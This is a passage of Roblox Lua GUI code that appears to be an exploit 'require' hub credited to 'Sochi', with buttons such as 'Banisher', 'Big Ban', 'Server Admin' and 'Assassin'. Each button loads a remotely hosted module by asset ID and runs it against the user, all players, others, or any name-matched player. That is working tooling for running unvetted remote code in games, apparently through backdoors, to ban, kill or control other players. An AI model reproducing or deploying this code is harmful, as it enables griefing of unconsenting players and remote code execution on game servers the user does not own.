TextButton230.TextSize = 14
TextButton230.TextWrap = true
TextButton230.TextWrapped = true
TextButton230.TextXAlignment = Enum.TextXAlignment.Left
Script231.Parent = TextButton230
table.insert(cors,sandbox(Script231,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4661993656).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4661993656).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4661993656).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4661993656).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel232.Name = "Vertical"
ImageLabel232.Parent = TextButton230
ImageLabel232.Position = UDim2.new(0, -2, 0, 0)
ImageLabel232.Size = UDim2.new(1, 3, 1, 0)
ImageLabel232.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel232.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel232.BackgroundTransparency = 1
ImageLabel232.ZIndex = 3
ImageLabel232.Image = "rbxassetid://3570695787"
ImageLabel232.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel232.ScaleType = Enum.ScaleType.Slice
ImageLabel232.SliceCenter = 100, 100, 100, 100
TextButton233.Name = "Admin"
TextButton233.Parent = ScrollingFrame100
TextButton233.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -100)
TextButton233.Size = UDim2.new(0, 271, 0, 21)
TextButton233.BackgroundColor = BrickColor.new("Really black")
TextButton233.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton233.BackgroundTransparency = 1
TextButton233.BorderColor = BrickColor.new("Really black")
TextButton233.BorderColor3 = Color3.new(0, 0, 0)
TextButton233.ZIndex = 7
TextButton233.Font = Enum.Font.SourceSansSemibold
TextButton233.FontSize = Enum.FontSize.Size14
TextButton233.Text = "Freezing Despair"
TextButton233.TextColor = BrickColor.new("Institutional white")
TextButton233.TextColor3 = Color3.new(1, 1, 1)
TextButton233.TextSize = 14
TextButton233.TextWrap = true
TextButton233.TextWrapped = true
TextButton233.TextXAlignment = Enum.TextXAlignment.Left
Script234.Parent = TextButton233
table.insert(cors,sandbox(Script234,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4651935181).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4651935181).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4651935181).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4651935181).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel235.Name = "Vertical"
ImageLabel235.Parent = TextButton233
ImageLabel235.Position = UDim2.new(0, -2, 0, 0)
ImageLabel235.Size = UDim2.new(1, 3, 1, 0)
ImageLabel235.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel235.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel235.BackgroundTransparency = 1
ImageLabel235.ZIndex = 3
ImageLabel235.Image = "rbxassetid://3570695787"
ImageLabel235.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel235.ScaleType = Enum.ScaleType.Slice
ImageLabel235.SliceCenter = 100, 100, 100, 100
TextButton236.Name = "Admin"
TextButton236.Parent = ScrollingFrame100
TextButton236.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -76)
TextButton236.Size = UDim2.new(0, 271, 0, 21)
TextButton236.BackgroundColor = BrickColor.new("Really black")
TextButton236.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton236.BackgroundTransparency = 1
TextButton236.BorderColor = BrickColor.new("Really black")
TextButton236.BorderColor3 = Color3.new(0, 0, 0)
TextButton236.ZIndex = 7
TextButton236.Font = Enum.Font.SourceSansSemibold
TextButton236.FontSize = Enum.FontSize.Size14
TextButton236.Text = "Banisher"
TextButton236.TextColor = BrickColor.new("Institutional white")
TextButton236.TextColor3 = Color3.new(1, 1, 1)
TextButton236.TextSize = 14
TextButton236.TextWrap = true
TextButton236.TextWrapped = true
TextButton236.TextXAlignment = Enum.TextXAlignment.Left
Script237.Parent = TextButton236
table.insert(cors,sandbox(Script237,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4637779988).a(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4637779988).a(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4637779988).a(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4637779988).a(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel238.Name = "Vertical"
ImageLabel238.Parent = TextButton236
ImageLabel238.Position = UDim2.new(0, -2, 0, 0)
ImageLabel238.Size = UDim2.new(1, 3, 1, 0)
ImageLabel238.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel238.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel238.BackgroundTransparency = 1
ImageLabel238.ZIndex = 3
ImageLabel238.Image = "rbxassetid://3570695787"
ImageLabel238.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel238.ScaleType = Enum.ScaleType.Slice
ImageLabel238.SliceCenter = 100, 100, 100, 100
TextButton239.Name = "Admin"
TextButton239.Parent = ScrollingFrame100
TextButton239.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -52)
TextButton239.Size = UDim2.new(0, 271, 0, 21)
TextButton239.BackgroundColor = BrickColor.new("Really black")
TextButton239.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton239.BackgroundTransparency = 1
TextButton239.BorderColor = BrickColor.new("Really black")
TextButton239.BorderColor3 = Color3.new(0, 0, 0)
TextButton239.ZIndex = 7
TextButton239.Font = Enum.Font.SourceSansSemibold
TextButton239.FontSize = Enum.FontSize.Size14
TextButton239.Text = "Legacy GUI"
TextButton239.TextColor = BrickColor.new("Institutional white")
TextButton239.TextColor3 = Color3.new(1, 1, 1)
TextButton239.TextSize = 14
TextButton239.TextWrap = true
TextButton239.TextWrapped = true
TextButton239.TextXAlignment = Enum.TextXAlignment.Left
Script240.Parent = TextButton239
table.insert(cors,sandbox(Script240,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4665308057):Fire(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4665308057):Fire(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4665308057):Fire(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4665308057):Fire(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel241.Name = "Vertical"
ImageLabel241.Parent = TextButton239
ImageLabel241.Position = UDim2.new(0, -2, 0, 0)
ImageLabel241.Size = UDim2.new(1, 3, 1, 0)
ImageLabel241.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel241.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel241.BackgroundTransparency = 1
ImageLabel241.ZIndex = 3
ImageLabel241.Image = "rbxassetid://3570695787"
ImageLabel241.ImageColor3 = Color3.new(0.623529, 0.623529, 0.623529)
ImageLabel241.ScaleType = Enum.ScaleType.Slice
ImageLabel241.SliceCenter = 100, 100, 100, 100
TextButton242.Name = "Admin"
TextButton242.Parent = ScrollingFrame100
TextButton242.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -28)
TextButton242.Size = UDim2.new(0, 271, 0, 21)
TextButton242.BackgroundColor = BrickColor.new("Really black")
TextButton242.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton242.BackgroundTransparency = 1
TextButton242.BorderColor = BrickColor.new("Really black")
TextButton242.BorderColor3 = Color3.new(0, 0, 0)
TextButton242.ZIndex = 7
TextButton242.Font = Enum.Font.SourceSansSemibold
TextButton242.FontSize = Enum.FontSize.Size14
TextButton242.Text = "Blind Reaper"
TextButton242.TextColor = BrickColor.new("Institutional white")
TextButton242.TextColor3 = Color3.new(1, 1, 1)
TextButton242.TextSize = 14
TextButton242.TextWrap = true
TextButton242.TextWrapped = true
TextButton242.TextXAlignment = Enum.TextXAlignment.Left
Script243.Parent = TextButton242
table.insert(cors,sandbox(Script243,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4665382251).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4665382251).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4665382251).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4665382251).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel244.Name = "Vertical"
ImageLabel244.Parent = TextButton242
ImageLabel244.Position = UDim2.new(0, -2, 0, 0)
ImageLabel244.Size = UDim2.new(1, 3, 1, 0)
ImageLabel244.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel244.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel244.BackgroundTransparency = 1
ImageLabel244.ZIndex = 3
ImageLabel244.Image = "rbxassetid://3570695787"
ImageLabel244.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel244.ScaleType = Enum.ScaleType.Slice
ImageLabel244.SliceCenter = 100, 100, 100, 100
TextButton245.Name = "Admin"
TextButton245.Parent = ScrollingFrame100
TextButton245.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -4)
TextButton245.Size = UDim2.new(0, 271, 0, 21)
TextButton245.BackgroundColor = BrickColor.new("Really black")
TextButton245.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton245.BackgroundTransparency = 1
TextButton245.BorderColor = BrickColor.new("Really black")
TextButton245.BorderColor3 = Color3.new(0, 0, 0)
TextButton245.ZIndex = 7
TextButton245.Font = Enum.Font.SourceSansSemibold
TextButton245.FontSize = Enum.FontSize.Size14
TextButton245.Text = "Server Admin"
TextButton245.TextColor = BrickColor.new("Institutional white")
TextButton245.TextColor3 = Color3.new(1, 1, 1)
TextButton245.TextSize = 14
TextButton245.TextWrap = true
TextButton245.TextWrapped = true
TextButton245.TextXAlignment = Enum.TextXAlignment.Left
Script246.Parent = TextButton245
table.insert(cors,sandbox(Script246,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4665394711).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4665394711).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4665394711).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4665394711).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel247.Name = "Vertical"
ImageLabel247.Parent = TextButton245
ImageLabel247.Position = UDim2.new(0, -2, 0, 0)
ImageLabel247.Size = UDim2.new(1, 3, 1, 0)
ImageLabel247.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel247.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel247.BackgroundTransparency = 1
ImageLabel247.ZIndex = 3
ImageLabel247.Image = "rbxassetid://3570695787"
ImageLabel247.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel247.ScaleType = Enum.ScaleType.Slice
ImageLabel247.SliceCenter = 100, 100, 100, 100
TextButton248.Name = "Admin"
TextButton248.Parent = ScrollingFrame100
TextButton248.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 20)
TextButton248.Size = UDim2.new(0, 271, 0, 21)
TextButton248.BackgroundColor = BrickColor.new("Really black")
TextButton248.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton248.BackgroundTransparency = 1
TextButton248.BorderColor = BrickColor.new("Really black")
TextButton248.BorderColor3 = Color3.new(0, 0, 0)
TextButton248.ZIndex = 7
TextButton248.Font = Enum.Font.SourceSansSemibold
TextButton248.FontSize = Enum.FontSize.Size14
TextButton248.Text = "Assassin"
TextButton248.TextColor = BrickColor.new("Institutional white")
TextButton248.TextColor3 = Color3.new(1, 1, 1)
TextButton248.TextSize = 14
TextButton248.TextWrap = true
TextButton248.TextWrapped = true
TextButton248.TextXAlignment = Enum.TextXAlignment.Left
Script249.Parent = TextButton248
table.insert(cors,sandbox(Script249,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4653190835).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4653190835).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4653190835).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4653190835).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel250.Name = "Vertical"
ImageLabel250.Parent = TextButton248
ImageLabel250.Position = UDim2.new(0, -2, 0, 0)
ImageLabel250.Size = UDim2.new(1, 3, 1, 0)
ImageLabel250.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel250.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel250.BackgroundTransparency = 1
ImageLabel250.ZIndex = 3
ImageLabel250.Image = "rbxassetid://3570695787"
ImageLabel250.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel250.ScaleType = Enum.ScaleType.Slice
ImageLabel250.SliceCenter = 100, 100, 100, 100
TextButton251.Name = "Admin"
TextButton251.Parent = ScrollingFrame100
TextButton251.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 44)
TextButton251.Size = UDim2.new(0, 271, 0, 21)
TextButton251.BackgroundColor = BrickColor.new("Really black")
TextButton251.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton251.BackgroundTransparency = 1
TextButton251.BorderColor = BrickColor.new("Really black")
TextButton251.BorderColor3 = Color3.new(0, 0, 0)
TextButton251.ZIndex = 7
TextButton251.Font = Enum.Font.SourceSansSemibold
TextButton251.FontSize = Enum.FontSize.Size14
TextButton251.Text = "Big Ban"
TextButton251.TextColor = BrickColor.new("Institutional white")
TextButton251.TextColor3 = Color3.new(1, 1, 1)
TextButton251.TextSize = 14
TextButton251.TextWrap = true
TextButton251.TextWrapped = true
TextButton251.TextXAlignment = Enum.TextXAlignment.Left
Script252.Parent = TextButton251
table.insert(cors,sandbox(Script252,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4665818599).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4665818599).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4665818599).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4665818599).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel253.Name = "Vertical"
ImageLabel253.Parent = TextButton251
ImageLabel253.Position = UDim2.new(0, -2, 0, 0)
ImageLabel253.Size = UDim2.new(1, 3, 1, 0)
ImageLabel253.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel253.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel253.BackgroundTransparency = 1
ImageLabel253.ZIndex = 3
ImageLabel253.Image = "rbxassetid://3570695787"
ImageLabel253.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel253.ScaleType = Enum.ScaleType.Slice
ImageLabel253.SliceCenter = 100, 100, 100, 100
TextButton254.Name = "Admin"
TextButton254.Parent = ScrollingFrame100
TextButton254.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 68)
TextButton254.Size = UDim2.new(0, 271, 0, 21)
TextButton254.BackgroundColor = BrickColor.new("Really black")
TextButton254.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton254.BackgroundTransparency = 1
TextButton254.BorderColor = BrickColor.new("Really black")
TextButton254.BorderColor3 = Color3.new(0, 0, 0)
TextButton254.ZIndex = 7
TextButton254.Font = Enum.Font.SourceSansSemibold
TextButton254.FontSize = Enum.FontSize.Size14
TextButton254.Text = "Broken Angel"
TextButton254.TextColor = BrickColor.new("Institutional white")
TextButton254.TextColor3 = Color3.new(1, 1, 1)
TextButton254.TextSize = 14
TextButton254.TextWrap = true
TextButton254.TextWrapped = true
TextButton254.TextXAlignment = Enum.TextXAlignment.Left
Script255.Parent = TextButton254
table.insert(cors,sandbox(Script255,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4665826032).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4665826032).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4665826032).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4665826032).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel256.Name = "Vertical"
ImageLabel256.Parent = TextButton254
ImageLabel256.Position = UDim2.new(0, -2, 0, 0)
ImageLabel256.Size = UDim2.new(1, 3, 1, 0)
ImageLabel256.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel256.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel256.BackgroundTransparency = 1
ImageLabel256.ZIndex = 3
ImageLabel256.Image = "rbxassetid://3570695787"
ImageLabel256.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel256.ScaleType = Enum.ScaleType.Slice
ImageLabel256.SliceCenter = 100, 100, 100, 100
TextButton257.Name = "Admin"
TextButton257.Parent = ScrollingFrame100
TextButton257.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 92)
TextButton257.Size = UDim2.new(0, 271, 0, 21)
TextButton257.BackgroundColor = BrickColor.new("Really black")
TextButton257.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton257.BackgroundTransparency = 1
TextButton257.BorderColor = BrickColor.new("Really black")
TextButton257.BorderColor3 = Color3.new(0, 0, 0)
TextButton257.ZIndex = 7
TextButton257.Font = Enum.Font.SourceSansSemibold
TextButton257.FontSize = Enum.FontSize.Size14
TextButton257.Text = "Brutal Overload"
TextButton257.TextColor = BrickColor.new("Institutional white")
TextButton257.TextColor3 = Color3.new(1, 1, 1)
TextButton257.TextSize = 14
TextButton257.TextWrap = true
TextButton257.TextWrapped = true
TextButton257.TextXAlignment = Enum.TextXAlignment.Left
Script258.Parent = TextButton257
table.insert(cors,sandbox(Script258,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4665840906).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4665840906).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4665840906).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4665840906).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel259.Name = "Vertical"
ImageLabel259.Parent = TextButton257
ImageLabel259.Position = UDim2.new(0, -2, 0, 0)
ImageLabel259.Size = UDim2.new(1, 3, 1, 0)
ImageLabel259.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel259.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel259.BackgroundTransparency = 1
ImageLabel259.ZIndex = 3
ImageLabel259.Image = "rbxassetid://3570695787"
ImageLabel259.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel259.ScaleType = Enum.ScaleType.Slice
ImageLabel259.SliceCenter = 100, 100, 100, 100
TextButton260.Name = "Admin"
TextButton260.Parent = ScrollingFrame100
TextButton260.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 116)
TextButton260.Size = UDim2.new(0, 271, 0, 21)
TextButton260.BackgroundColor = BrickColor.new("Really black")
TextButton260.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton260.BackgroundTransparency = 1
TextButton260.BorderColor = BrickColor.new("Really black")
TextButton260.BorderColor3 = Color3.new(0, 0, 0)
TextButton260.ZIndex = 7
TextButton260.Font = Enum.Font.SourceSansSemibold
TextButton260.FontSize = Enum.FontSize.Size14
TextButton260.Text = "Cadillac"
TextButton260.TextColor = BrickColor.new("Institutional white")
TextButton260.TextColor3 = Color3.new(1, 1, 1)
TextButton260.TextSize = 14
TextButton260.TextWrap = true
TextButton260.TextWrapped = true
TextButton260.TextXAlignment = Enum.TextXAlignment.Left
Script261.Parent = TextButton260
table.insert(cors,sandbox(Script261,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4612742352).drifto(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4612742352).drifto(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4612742352).drifto(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4612742352).drifto(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel262.Name = "Vertical"
ImageLabel262.Parent = TextButton260
ImageLabel262.Position = UDim2.new(0, -2, 0, 0)
ImageLabel262.Size = UDim2.new(1, 3, 1, 0)
ImageLabel262.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel262.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel262.BackgroundTransparency = 1
ImageLabel262.ZIndex = 3
ImageLabel262.Image = "rbxassetid://3570695787"
ImageLabel262.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel262.ScaleType = Enum.ScaleType.Slice
ImageLabel262.SliceCenter = 100, 100, 100, 100
TextButton263.Name = "Admin"
TextButton263.Parent = ScrollingFrame100
TextButton263.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 140)
TextButton263.Size = UDim2.new(0, 271, 0, 21)
TextButton263.BackgroundColor = BrickColor.new("Really black")
TextButton263.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton263.BackgroundTransparency = 1
TextButton263.BorderColor = BrickColor.new("Really black")
TextButton263.BorderColor3 = Color3.new(0, 0, 0)
TextButton263.ZIndex = 7
TextButton263.Font = Enum.Font.SourceSansSemibold
TextButton263.FontSize = Enum.FontSize.Size14
TextButton263.Text = "Sadist"
TextButton263.TextColor = BrickColor.new("Institutional white")
TextButton263.TextColor3 = Color3.new(1, 1, 1)
TextButton263.TextSize = 14
TextButton263.TextWrap = true
TextButton263.TextWrapped = true
TextButton263.TextXAlignment = Enum.TextXAlignment.Left
Script264.Parent = TextButton263
table.insert(cors,sandbox(Script264,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4665990665).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4665990665).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4665990665).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4665990665).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel265.Name = "Vertical"
ImageLabel265.Parent = TextButton263
ImageLabel265.Position = UDim2.new(0, -2, 0, 0)
ImageLabel265.Size = UDim2.new(1, 3, 1, 0)
ImageLabel265.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel265.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel265.BackgroundTransparency = 1
ImageLabel265.ZIndex = 3
ImageLabel265.Image = "rbxassetid://3570695787"
ImageLabel265.ImageColor3 = Color3.new(0.666667, 0.333333, 1)
ImageLabel265.ScaleType = Enum.ScaleType.Slice
ImageLabel265.SliceCenter = 100, 100, 100, 100
TextButton266.Name = "Admin"
TextButton266.Parent = ScrollingFrame100
TextButton266.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 164)
TextButton266.Size = UDim2.new(0, 271, 0, 21)
TextButton266.BackgroundColor = BrickColor.new("Really black")
TextButton266.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton266.BackgroundTransparency = 1
TextButton266.BorderColor = BrickColor.new("Really black")
TextButton266.BorderColor3 = Color3.new(0, 0, 0)
TextButton266.ZIndex = 7
TextButton266.Font = Enum.Font.SourceSansSemibold
TextButton266.FontSize = Enum.FontSize.Size14
TextButton266.Text = "Empyr"
TextButton266.TextColor = BrickColor.new("Institutional white")
TextButton266.TextColor3 = Color3.new(1, 1, 1)
TextButton266.TextSize = 14
TextButton266.TextWrap = true
TextButton266.TextWrapped = true
TextButton266.TextXAlignment = Enum.TextXAlignment.Left
Script267.Parent = TextButton266
table.insert(cors,sandbox(Script267,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
